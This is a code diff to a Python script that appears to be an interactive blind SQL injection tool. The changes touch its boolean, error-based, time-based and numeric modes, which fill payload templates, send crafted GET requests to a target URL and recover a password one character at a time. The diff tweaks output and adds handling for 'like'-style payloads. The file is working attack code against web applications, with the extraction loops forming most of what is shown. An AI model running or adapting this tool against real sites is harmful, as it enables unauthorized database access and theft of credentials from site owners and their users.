@@ -61,7 +61,7 @@ def Get_Boolean(url , header , p):
     list=[]
     num = 0        
     for ch in f1:                
-        print(num , ch)
+        print(num, ". " , ch)
         num = num + 1
         list.append(ch)
     print("99. custom payload")           
@@ -80,7 +80,7 @@ def Get_Boolean(url , header , p):
             pw  = pw_choose.replace("{pw}",s_p).replace("{i}",str(i)).replace("{j}" , pass_1).replace("\n","")
             get = session.get(url = url , headers=header , params=f"{p}={pw}")            
             if (sp in get.text):
-                print(len(get.text) , pw[2:] ,get.url)                      
+                print(len(get.text) , pw ,get.url)                      
                 password = password + j
                 print(password)
                 break
@@ -93,7 +93,7 @@ def Get_Error_based(url , header , p):
     list=[]
     num = 0        
     for ch in f1:                
-        print(num , ch)
+        print(num, ". " , ch)
         num = num + 1
         list.append(ch)
     user_ch = int(input("your choose : "))
@@ -101,14 +101,19 @@ def Get_Error_based(url , header , p):
     sp2 = input("special dissappear : ")
     len_pw = int(input("length :"))
     password = ""
+    pass1 = ""
     s_p = input("Sepecial params : ")
     for i in range(1, len_pw):
         for j in char:
-            pw = list[user_ch].replace("{pw}", s_p).replace("{i}", str(i)).replace("{j}", str(ord(j))).replace("\n", "")
+            if "like" in list[user_ch]:
+                pass1 = password + j
+                pw = list[user_ch].replace("{pw}", s_p).replace("{i}", str(i)).replace("{j}", pass1).replace("\n", "")
+            else:    
+                pw = list[user_ch].replace("{pw}", s_p).replace("{i}", str(i)).replace("{j}", str(ord(j))).replace("\n", "")
             get = session.get(url=url, headers=header, params=f"{p}={pw}")
             #print( get.url , get.status_code)
             if sp1 in get.text or sp2 not in get.text:
-                print(len(get.text), pw[2:], get.url)
+                print(len(get.text), pw, get.url)
                 password = password + j
                 print(password)
                 break
@@ -147,7 +152,7 @@ def Get_Time_based(url , header , p):
     list=[]
     num = 0        
     for ch in f1:                
-        print(num , ch)
+        print(num, ". " , ch)
         num = num +1
         list.append(ch)
     
@@ -162,7 +167,8 @@ def Get_Time_based(url , header , p):
             pw = list[user_ch].replace("{pw}", s_p).replace("{i}", str(i)).replace("{j}", str(ord(j))).replace("\n", "").replace("{col}" , col)
             get = session.get(url=url, headers=header, params=f"{p}={pw}")            
             timing = time.time() - start
-            print(timing)
+            #print(get.url)
+            print(str(ord(j)), timing)
             if timing > 2:
                 print(len(get.text), pw[2:], get.url)
                 password = password + j
@@ -189,7 +195,7 @@ def Get_Numeric(url , header , p):
     list=[]
     num = 0         
     for ch in f1:                
-        print(num , ch)
+        print(num, ". " , ch)
         num = num +1
         list.append(ch)
     user_ch = int(input("your choose : "))
